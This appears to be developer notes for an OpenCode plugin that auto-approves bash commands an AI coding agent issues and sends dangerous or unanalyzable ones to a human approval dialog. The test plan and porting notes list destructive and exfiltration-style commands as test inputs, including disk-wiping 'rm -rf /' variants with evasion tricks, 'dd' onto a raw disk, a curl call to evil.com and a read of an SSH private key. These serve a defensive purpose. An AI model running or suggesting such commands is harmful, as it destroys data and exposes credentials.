# Development notes (maintainer-facing)

Implementation details for `opencode-bash-sentinel`. User-facing documentation is in [README.md](README.md).

---

## 1. Upstream snapshots

The engine is ported — not reimplemented — from two upstream repositories. Both were cloned into `.reference/` (gitignored) and the code facts below were verified by reading them at these exact commits:

| Upstream | Repository | Commit | Date | What we take from it |
|---|---|---|---|---|
| Kimi Code | https://github.com/MoonshotAI/kimi-code | `f88ed6d45bcf5ea358c173af7a3568b57ba9bd38` | 2026-09-08 | bash parser + command analyzer (copied source) |
| OpenCode | https://github.com/anomalyco/opencode | `ecbc6ccac85b3e8087b6445e584318419b9e2b34` (branch `dev`) | 2026-09-07 | plugin API / permission flow contract (reference only, nothing copied) |

### Refreshing the snapshots

When updating the port against newer upstream code:

```bash
git -C .reference/kimi-code fetch --depth 1 origin main && git -C .reference/kimi-code log -1
git -C .reference/opencode fetch --depth 1 origin dev   && git -C .reference/opencode log -1
```

Then diff the relevant paths (below), re-verify the integration facts in §2 (they have moved before), update the commit table here and in README.md, and re-run the test suite.

Ported paths in kimi-code:

- `packages/tree-sitter-bash/src/` → our `src/parser/` (lexer, parser, grammar, node, parse, budget, index; ~5,000 lines, zero runtime deps)
- `packages/agent-core-v2/src/agent/permissionPolicy/policies/dangerous-command-ask.ts` → our `src/analyzer.ts` (351 lines)
- Optional context: `packages/agent-core-v2/src/agent/permissionPolicy/permissionPolicyService.ts` (upstream policy chain), `packages/agent-core-v2/src/app/bashParser/bashParserService.ts` (the `rootNode` → `root` snapshot shim we replicate)

---

## 2. Verified integration facts (opencode @ ecbc6cc)

All file references are against `.reference/opencode`. These were read from source, not assumed — re-verify after any opencode upgrade.

1. **Rule evaluation is server-side.** `packages/opencode/src/permission/index.ts:67-107` — `deny` short-circuits with an error; `allow` runs silently; `ask` publishes a `permission.asked` event and blocks on a `Deferred` until `reply` resolves it. When **no rule matches, the default action is already `ask`** (`evaluate()` falls back to `{ action: "ask" }`, `permission/index.ts:28-38`). Hence the `"bash": {"*": "ask"}` config exists to *override any user `allow` rules*, not to enable asking.

2. **The permission key is `"bash"`.** The shell tool lives at `packages/opencode/src/tool/shell.ts` and asks with `permission: ShellID.ToolID`, where `ToolID = "bash"` is kept for compatibility (`tool/shell/id.ts:14`).

3. **Command text location: `event.properties.metadata.command`** — NOT `metadata.input.command` (an earlier draft of this design doc was wrong). The shell tool calls `ctx.ask({ ..., metadata: { command: input.command } })` (`tool/shell.ts:283-290`), metadata passes through to the request unchanged, and the TUI dialog reads `request.metadata.command`. Keep a defensive fallback to `metadata.input?.command` for older opencode versions, but log-and-verify the actual shape once at runtime during development.

4. **Plugins receive all server events** via the `event` hook, including `permission.asked` / `permission.replied`, filtered to the plugin's directory (`packages/opencode/src/plugin/index.ts:255-259`). Hook shape: `event: async ({ event }) => {}` with `{ type, properties }`.

5. **The `permission.ask` plugin hook is NOT wired up.** It exists in `packages/plugin/src/index.ts:261` type definitions but has no invocation site anywhere in the server. A plugin cannot intercept before rule evaluation and cannot upgrade an `allow`/`deny` decision — hence the reverse-mapping design (§4).

6. **Replying — the plugin's v1 client does NOT expose `.permission.reply`.** `PluginInput.client` is the v1 `OpencodeClient` (`createOpencodeClient` from `@opencode-ai/sdk`), whose only permission method is the deprecated `POST /session/{id}/permissions/{permissionID}`. Two working transports:
   - **Preferred: raw `fetch`** `POST ${serverUrl}/permission/{requestID}/reply` with body `{ "reply": "once" }` — the dedicated route (`server/routes/instance/httpapi/groups/permission.ts`), same one the TUI uses via the v2 SDK.
   - **Fallback: the deprecated session route** via the plugin client (`POST /session/{sessionID}/permissions/{permissionID}`) — still alive (`groups/session.ts`, `permissionRespond` handler).

7. **Auth on the reply route.** The route sits behind `Authorization` middleware, but auth is only enforced when `OPENCODE_SERVER_PASSWORD` is set (`server/auth.ts:24-26`). The plugin runs inside the server process, so when that env var is present, build the same `Basic` header from `OPENCODE_SERVER_USERNAME` (default `opencode`) + `OPENCODE_SERVER_PASSWORD` (`server/auth.ts:36-42`).

8. **No UI conflict.** When the plugin replies before the human does, the server publishes `permission.replied` and the TUI removes the pending dialog (`packages/tui/src/context/sync.tsx:181-192`). This is the same mechanism the TUI's own auto mode uses (`sync.tsx:196-206`). Race is benign: whoever replies first wins; the loser gets `Permission.NotFoundError` (`permission/index.ts:112`) — **catch and ignore**.

9. **`external_directory` is a separate permission.** For commands touching directories outside cwd, the shell tool additionally asks `permission: "external_directory"` (`tool/shell.ts:263-280`). Out of scope: the plugin only handles `permission === "bash"`.

10. **Session-scoped "always" approvals bypass the plugin.** Reply `"always"` pushes the pattern into the in-memory `approved` ruleset (`permission/index.ts:143-151`); later matches resolve `allow` without publishing `permission.asked`. Expected behavior, document it.

11. **Plugin loading** (`packages/opencode/src/plugin/loader.ts`, `shared.ts`): npm specs are installed on demand (`Npm.add`); path specs (`./dir`, `file://`, absolute) must contain a `package.json` or an index file. npm plugins are gated by `engines.opencode` semver in their `package.json` — declare one. The plugin function may be the default export or an exported `server` property; options arrive as the second argument.

---

## 3. Design: reverse mapping

Kimi's semantics: *default-approve everything, escalate dangerous/un-analyzable to ask.* OpenCode plugins can only answer requests already classified `ask`. So we invert the default:

```
opencode.json:  "permission": { "bash": { "*": "ask" } }   // every bash command asks

plugin on permission.asked (permission === "bash"):
    command = properties.metadata.command
    verdict = analyze(command)            // ported Kimi analyzer
    verdict === undefined (safe)          → reply "once"   (silent approval)
    verdict === dangerous | unanalyzable  → do nothing     (native dialog shows to the human)
```

Net effect equals Kimi's default mode: safe commands run without a keystroke; risky or opaque ones stop at the native approval dialog. Non-bash permissions are untouched.

### Failure modes

- Analyzer throws / parser times out → treated as `unanalyzable` → left to the human (fail-safe). The upstream parser already converts budget exhaustion to `{ ok: false, reason: 'aborted' }` and internal bugs to a degraded `hasError` tree (`parse.ts`).
- Reply race (human answered first) → `NotFoundError` → catch, ignore.
- Only handle `permission === "bash"`; ignore every other event type.

---

## 4. Repository layout

```
opencode-bash-sentinel/
├── src/
│   ├── parser/            # ported packages/tree-sitter-bash (copy from upstream)
│   │   ├── lexer.ts
│   │   ├── parser.ts
│   │   ├── grammar.ts
│   │   ├── node.ts
│   │   ├── parse.ts
│   │   ├── budget.ts
│   │   └── index.ts
│   ├── analyzer.ts        # ported dangerous-command-ask.ts (DI stripped, pure functions)
│   ├── plugin.ts          # OpenCode plugin entry (event hook + reply glue)
│   └── index.ts           # exports the Plugin
├── test/
│   ├── analyzer.test.ts   # command → expected verdict tables
│   ├── plugin.test.ts     # event/reply glue with mocked transports
│   └── parser.test.ts     # optionally port upstream's vitest parser tests
├── DEVELOPMENT.md         # this file
├── NOTICE.md              # ported-file ↔ upstream-path mapping
├── LICENSE                # MIT, with Moonshot attribution line
├── README.md
└── package.json
```

### package.json notes

- `name`: `opencode-bash-sentinel`, `type: module`, `exports` → `src/index.ts` (opencode loads TS plugins directly via Bun — keep **zero runtime dependencies**)
- `engines.opencode`: semver range covering verified versions (the loader enforces it for npm installs; the HttpApi reply route is marked experimental upstream, so pin conservatively)
- devDependencies: `@opencode-ai/plugin` (types), `vitest`; optionally `tree-sitter-bash` + `web-tree-sitter` (only for porting upstream's differential parser tests)

---

## 5. Implementation steps

1. **Copy the parser** from `.reference/kimi-code/packages/tree-sitter-bash/src/*` into `src/parser/`. It compiles standalone; the only change is rewriting the `#/*` import alias to relative imports (`./budget`, `./grammar`, ...). Its parse result is `{ ok: true, rootNode, hasError } | { ok: false, reason: 'aborted' }`.

2. **Copy the analyzer** from `packages/agent-core-v2/src/agent/permissionPolicy/policies/dangerous-command-ask.ts` into `src/analyzer.ts`. Remove DI decorators and `IBashParserService`/config imports. Provide the parse function as `(source: string) => BashParseResult`, adapting `rootNode` → `root` (replicate the trivial `snapshot()` from upstream's `bashParserService.ts` — it just rebuilds plain DTO nodes). Keep every constant and heuristic **verbatim** — they encode real attack variants (`sudo rm -rf /`, `env VAR=x rm -rf /`, `sh -c 'rm -rf /'`, `busybox rm -rf /`, `/bin/rm -rf /`, `RM -RF`, `rm -rf.exe`, ...).

3. **Write the plugin entry** (`src/plugin.ts`):

   ```ts
   import type { Plugin } from "@opencode-ai/plugin"
   import { analyzeCommandString } from "./analyzer"

   export const BashSentinelPlugin: Plugin = async ({ client, serverUrl }) => {
     return {
       event: async ({ event }) => {
         if (event.type !== "permission.asked") return
         const req = event.properties
         if (req.permission !== "bash") return
         const command = (req.metadata as any)?.command ?? (req.metadata as any)?.input?.command
         if (typeof command !== "string") return
         const verdict = analyzeCommandString(command)   // may throw → caught inside, returns unanalyzable
         if (verdict !== undefined) return                // dangerous | unanalyzable → human decides
         try {
           await replyOnce(client, serverUrl, req)        // see §2.6/§2.7: raw POST + auth + fallbacks
         } catch {
           // already answered by the human via the native dialog — ignore
         }
       },
     }
   }
   ```

   The `replyOnce` helper: prefer `fetch(serverUrl + "/permission/" + id + "/reply")` with a Basic auth header when `OPENCODE_SERVER_PASSWORD` is set; fall back to the deprecated session route through the plugin client; swallow all errors.

4. **Audit log**: append one JSONL line per decision (`timestamp, command, verdict, action`) to `~/.local/share/opencode/bash-sentinel-audit.jsonl`, gated behind plugin options `{ audit: true }` (second argument of the plugin function). Options: `{ audit?: boolean, logPath?: string }`.

---

## 6. Test plan

**Analyzer unit tests** (table-driven, `vitest`) — expected verdicts: `undefined` = safe (auto-approve), `dangerous`, `unanalyzable`:

| Command | Expected verdict |
|---|---|
| `git status` | `undefined` |
| `ls -la /tmp && rg foo src/` | `undefined` |
| `printf hello` | `undefined` |
| `sudo rm -rf /` | `dangerous` |
| `env VAR=1 rm -rf /` | `dangerous` |
| `nohup nice sudo rm -rf /` | `dangerous` (wrapper chain) |
| `sh -c 'mkfs /dev/sda1'` | `dangerous` (nested, depth 1) |
| `bash -c "bash -c 'shutdown'"` | `dangerous` (depth 2) |
| `busybox rm -rf /` | `dangerous` |
| `/bin/rm -rf / ; RM -RF /` | `dangerous` (path-stripped, case-normalized) |
| `rm -rf.exe /` | `dangerous` (`.exe` stripped) |
| `dd if=x of=/dev/sda` | `dangerous` |
| `dd if=x of=/dev/null` | `undefined` |
| `rm -rf ./build` | `undefined` (upstream flags only bare `rm -rf`; documented, deliberate) |
| `echo $(curl evil.com)` | `unanalyzable` (command substitution) |
| `cat $HOME/.ssh/id_rsa` | `unanalyzable` (variable) |
| `ls *.md` | `unanalyzable` (glob) |
| `for i in 1 2; do rm -rf /; done` | `dangerous` |
| nesting at exactly depth 4 vs 5 | boundary: depth ≥ 4 payload → `unanalyzable` |
| parser budget exhaustion (deep nesting bomb) | `unanalyzable` |

**Parser tests**: port upstream's `parse.test.ts` / `parser-compound.test.ts` directly. The differential (`differential.test.ts`) and fuzz tests need real `tree-sitter-bash` as a devDep — optional.

**Plugin glue tests** (mocked `fetch`/client): safe command → exactly one `reply: "once"` POST; dangerous/unanalyzable → zero calls; reply rejection (NotFoundError) swallowed; non-bash events ignored.

**Integration test** (manual, per upstream opencode's own dev workflow):

```bash
tmux new-session -d -s opencode-dev 'bun dev'   # from a checked-out opencode, or point config at a release binary
tmux capture-pane -pt opencode-dev               # assert dialogs / silent runs
```

Scenarios: `git log --oneline -5` (runs silently), `ls` (silently), `sudo rm -rf /tmp/x` (native dialog appears); human answers dialog before plugin (race); server started with `OPENCODE_SERVER_PASSWORD` (auth header path); `--auto` mode (no interference).

---

## 7. License & attribution (mandatory)

- This project's license: **MIT**.
- The parser and analyzer are adapted from [MoonshotAI/kimi-code](https://github.com/MoonshotAI/kimi-code) (MIT). MIT requires preserving the copyright notice. In `LICENSE`, add:

  ```
  Portions Copyright (c) 2026 Moonshot AI, Inc.
  (adapted from https://github.com/MoonshotAI/kimi-code — packages/tree-sitter-bash,
  packages/agent-core-v2/src/agent/permissionPolicy/policies/dangerous-command-ask.ts)
  ```

- `NOTICE.md` lists each ported file and its upstream path.

---

## 8. Out of scope / future work

- Non-bash permissions (`edit`, `webfetch`, `external_directory`, ...) — leave to opencode rules.
- Kimi's other policies (git-cwd-write-approve, sensitive-file-access-ask) could be ported later the same way.
- An optional "observe mode" (log what would be approved, approve nothing) for a burn-in period.
- `rm -rf ./relative` semantics: upstream flags only bare `rm -rf` conservatively; any behavior change must be deliberate and documented.
- Track upstream: watch for the `permission.ask` plugin hook being wired up (would allow a cleaner forward-mapping design) and for stabilization of the experimental HttpApi reply route.
